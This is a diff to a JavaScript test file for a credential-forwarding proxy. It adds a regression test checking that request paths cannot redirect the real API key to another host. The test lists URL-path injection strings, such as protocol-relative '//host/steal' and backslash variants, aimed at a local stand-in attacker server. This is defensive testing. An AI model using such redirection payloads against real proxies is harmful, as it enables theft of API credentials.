@@ -28,13 +28,17 @@ async function startUpstream() {
 }
 
 /** A home directory whose models.json points at the fake upstream. */
-function fakeHome(port) {
+function fakeHome(port, { baseUrl = null } = {}) {
   const home = fs.mkdtempSync(path.join(os.tmpdir(), "pi-proxy-home-"));
   const agent = path.join(home, ".pi", "agent");
   fs.mkdirSync(agent, { recursive: true });
   fs.writeFileSync(
     path.join(agent, "models.json"),
-    JSON.stringify({ providers: { "test-provider": { baseUrl: `http://127.0.0.1:${port}/v1`, api: "openai-completions" } } })
+    JSON.stringify({
+      providers: {
+        "test-provider": { baseUrl: baseUrl ?? `http://127.0.0.1:${port}/v1`, api: "openai-completions" }
+      }
+    })
   );
   return home;
 }
@@ -126,4 +130,39 @@ test("providers without a known endpoint are not proxied, and OAuth records are 
 
   await upstream.close();
   fs.rmSync(home, { recursive: true, force: true });
+});
+
+test("the request path cannot move the destination, so the key cannot be exfiltrated", async () => {
+  // The upstream here is the attacker's server: if the proxy can be talked into
+  // sending the real key anywhere, this is where it lands.
+  const attacker = await startUpstream();
+  // A base URL with no path is the dangerous shape — `//host/x` then resolves as
+  // a protocol-relative URL and replaces the origin outright.
+  const home = fakeHome(attacker.port, { baseUrl: "http://127.0.0.1:1/" });
+  const proxy = await startCredentialProxy({
+    homeDir: home,
+    provider: "test-provider",
+    authEntry: { type: "api_key", key: "REAL-SECRET-KEY" }
+  });
+  const local = proxy.url.replace("host.docker.internal", "127.0.0.1");
+
+  try {
+    for (const attempt of [
+      `//127.0.0.1:${attacker.port}/steal`,
+      `/\\/127.0.0.1:${attacker.port}/steal`,
+      `https://127.0.0.1:${attacker.port}/steal`
+    ]) {
+      const response = await fetch(`${local}${attempt}`, {
+        method: "POST",
+        headers: { authorization: `Bearer ${proxy.token}` },
+        body: "{}"
+      }).catch((error) => ({ status: `refused: ${error.message.slice(0, 20)}` }));
+      assert.notEqual(response.status, 200, `${attempt} must not succeed`);
+    }
+    assert.deepEqual(attacker.seen, [], "the credential never reached another host");
+  } finally {
+    await proxy.close();
+    await attacker.close();
+    fs.rmSync(home, { recursive: true, force: true });
+  }
 });
